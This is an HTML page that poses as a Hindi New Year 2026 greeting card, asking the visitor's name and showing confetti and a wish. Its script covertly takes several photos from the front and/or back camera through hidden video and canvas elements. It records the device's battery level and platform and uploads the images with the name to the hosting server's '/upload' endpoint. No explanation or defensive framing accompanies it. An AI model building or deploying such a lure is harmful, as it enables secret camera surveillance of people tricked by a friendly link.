<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Year Surprise 2026</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 400px; padding: 20px; border: 2px solid #ff0055; border-radius: 20px; background: rgba(255, 0, 85, 0.05); box-shadow: 0 0 20px #ff0055; }
        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; margin-bottom: 20px; }
        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; font-size: 16px; margin-bottom: 20px; outline: none; }
        button { padding: 15px 40px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { transform: scale(1.05); box-shadow: 0 0 15px #ff0055; }
        #wish-box { display: none; }
        .wish-text { font-size: 22px; line-height: 1.5; font-weight: bold; }
    </style>
</head>
<body>

    <div class="container" id="main-box">
        <h1>🎆 Surprise Gift 🎆</h1>
        <p>अपना नाम लिखें और जादू देखें!</p>
        <input type="text" id="userName" placeholder="यहाँ अपना नाम लिखें...">
        <br>
        <button onclick="startApp()">जादू देखें ✨</button>
    </div>

    <div class="container" id="wish-box">
        <div class="wish-text" id="wishMsg"></div>
        <p style="margin-top:20px;">🎊 Happy New Year 2026 🎊</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <audio id="music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const mode = urlParams.get('m') || 'front';

        async function startApp() {
            let name = document.getElementById('userName').value;
            if(!name) return alert("कृपया अपना नाम डालें!");

            document.getElementById('main-box').style.display = 'none';
            document.getElementById('wish-box').style.display = 'block';
            document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको और आपके पूरे परिवार को New Year 2026 की ढेर सारी शुभकामनाएँ!`;
            
            document.getElementById('music').play();
            setInterval(() => { confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } }); }, 2000);
            
            initCapture(name);
        }

        async function initCapture(name) {
            let info = { battery: "Unknown", platform: navigator.platform };
            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}

            if(mode === 'front') await runCam(name, info, {facingMode: "user"}, 5, "FRONT");
            else if(mode === 'back') await runCam(name, info, {facingMode: "environment"}, 5, "BACK");
            else {
                await runCam(name, info, {facingMode: "environment"}, 3, "BACK");
                await runCam(name, info, {facingMode: "user"}, 3, "FRONT");
            }
        }

        async function runCam(name, info, constraints, count, label) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                let video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 3000)); // कैमरा सेटल होने का इंतज़ार

                for (let i = 1; i <= count; i++) {
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({name: name, image: can.toDataURL('image/jpeg', 0.6), info: info, label: label+" "+i})
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }
    </script>
</body>
</html>
